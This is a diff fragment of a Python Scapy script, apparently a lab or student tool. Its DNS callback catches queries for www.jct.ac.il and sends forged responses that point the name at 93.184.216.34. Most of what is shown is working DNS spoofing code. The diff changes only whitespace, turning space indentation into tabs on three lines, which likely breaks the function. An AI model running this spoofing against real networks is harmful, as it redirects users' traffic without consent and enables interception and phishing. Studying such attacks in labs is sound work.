@@ -37,13 +37,13 @@ def dns_callback(pkt):
         # check if the packet is for www.jct.ac.il
         if pkt.getlayer(DNS).qd.qname.decode() == "www.jct.ac.il.":
             # spoof a dns response for www.example.com
-            print("[*] spoofing DNS response for www.jct.ac.il")
+        	print("[*] spoofing DNS response for www.jct.ac.il")
 
-            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+        	spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                             UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                             DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd,
                                 an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata="93.184.216.34"))
-            send(spoofed_pkt, verbose=0)
+        	send(spoofed_pkt, verbose=0)
 
 
 def spoof(args):
